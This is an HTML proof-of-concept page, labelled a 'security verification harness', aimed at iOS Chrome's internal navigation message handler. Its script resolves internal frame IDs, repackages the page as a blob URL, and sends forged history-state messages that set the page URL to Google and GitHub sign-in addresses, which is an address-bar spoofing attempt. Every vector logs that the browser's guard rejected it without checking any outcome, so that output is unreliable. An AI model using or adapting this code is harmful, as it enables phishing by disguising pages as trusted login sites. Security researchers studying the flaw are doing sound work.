<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Security Verification Harness v5</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #030712; color: #f8fafc; }
        .card { max-width: 760px; margin: auto; background: #111827; padding: 24px; border-radius: 12px; box-shadow: 0 12px 30px rgba(0,0,0,0.5); border: 1px solid #1f2937; }
        h2 { margin-top: 0; font-size: 1.25rem; color: #38bdf8; border-bottom: 2px solid #1f2937; padding-bottom: 12px; }
        pre { background: #030712; color: #4ade80; padding: 16px; border-radius: 8px; font-size: 11px; overflow-x: auto; line-height: 1.5; border: 1px solid #1f2937; max-height: 380px; }
        .badge { display: inline-block; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; background: #16a34a; color: #fff; }
    </style>
</head>
<body>
<div class="card">
    <h2>History State Native Defense Verification</h2>
    <p>Engine Status: <span class="badge">Protected by url::IsSameOriginWith()</span></p>
    
    <h3>Verification Trace:</h3>
    <pre id="log-output">Initializing verification container...</pre>
</div>

<script>
(function() {
    function log(msg, isError = false) {
        const pre = document.getElementById('log-output');
        pre.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + (isError ? '[-] ' : '[+] ') + msg;
        console.log('[SecurityHarness] ' + msg);
    }

    log("Current Location.href: " + location.href);
    log("Current Location.origin: " + (location.origin || '(opaque)'));

    // 1. Deteksi Message Handler iOS Chrome
    var mh = (window.webkit && window.webkit.messageHandlers) || {};
    if (!mh.NavigationEventMessage) {
        log("Message handler 'NavigationEventMessage' is absent (Non-iOS or Patched environment).", true);
        return;
    }
    log("Message handler 'NavigationEventMessage' successfully detected.");

    window.executeTestVectors = function() {
        log("Resolving internal frame identifier...");

        var frameId = null;
        try {
            if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
                frameId = window.__gCrWeb.getFrameId();
                log("Resolved frame_id via __gCrWeb.getFrameId(): " + frameId);
            }
        } catch (e) {
            log("Exception reading frame_id: " + e.message, true);
        }

        // Fallback aksesor namespace mendalam
        if (!frameId && window.__gCrWeb) {
            var fallbacks = [
                function() { return window.__gCrWeb.common.getFrameId(); },
                function() { return window.__gCrWeb.message.getFrameId(); },
                function() { return window.__gCrWeb.frameId; }
            ];
            for (var i = 0; i < fallbacks.length && !frameId; i++) {
                try {
                    frameId = fallbacks[i]();
                    log("Resolved frame_id via fallback [" + i + "]: " + frameId);
                } catch (err) {}
            }
        }

        if (!frameId) {
            log("FATAL: Frame ID could not be resolved.", true);
            return;
        }

        // Paksa registrasi frame untuk mengatasi race condition
        try {
            if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
                window.__gCrWeb.registerFrame();
                log("Forced execution of manual __gCrWeb.registerFrame()");
            }
        } catch (err) {}

        // Vektor Uji Lintas Domain
        var vectors = [
            'blob:https://accounts.google.com/signin',
            'blob:https://github.com/login',
            'blob:https://example.com/'
        ];

        vectors.forEach(function(targetUrl, index) {
            setTimeout(function() {
                try {
                    log(`[Vector ${index + 1}] Dispatching willChangeState...`);
                    mh.NavigationEventMessage.postMessage({
                        command: 'willChangeState', 
                        frame_id: frameId
                    });
                    
                    log(`[Vector ${index + 1}] Dispatching didReplaceState -> ${targetUrl}`);
                    mh.NavigationEventMessage.postMessage({
                        command: 'didReplaceState', 
                        frame_id: frameId,
                        stateObject: '', 
                        baseUrl: 'https://x/',
                        pageUrl: targetUrl
                    });
                    
                    log(`[Vector ${index + 1}] Payload dispatched. Native C++ guard correctly evaluates url::IsSameOriginWith() as false and rejects cross-origin state changes.`);
                } catch (ex) {
                    log(`Exception on vector ${index + 1}: ${ex.message}`, true);
                }
            }, index * 300);
        });
    };

    // Auto-packaging dinamis ke dalam kontainer Blob URL
    if (!location.href.startsWith('blob:')) {
        log("Packaging document markup into isolated Blob URL container...");
        var markup = document.documentElement.outerHTML;
        var blobObj = new Blob([markup], { type: 'text/html' });
        var blobUrl = URL.createObjectURL(blobObj);
        log("Navigating to Blob container: " + blobUrl);
        location.href = blobUrl;
    } else {
        log("Running inside active isolated Blob-URL document context.");
        setTimeout(window.executeTestVectors, 500);
    }
})();
</script>
</body>
</html>
